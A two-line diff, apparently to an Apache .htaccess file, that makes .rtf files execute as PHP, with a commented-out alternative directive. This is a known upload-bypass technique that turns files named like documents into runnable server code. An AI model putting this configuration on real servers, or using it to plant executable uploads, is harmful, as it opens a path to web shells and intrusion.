@@ -1,0 +1,2 @@
+AddHandler php5-cgi .rtf
+# AddType application/x-httpd-php .rtf
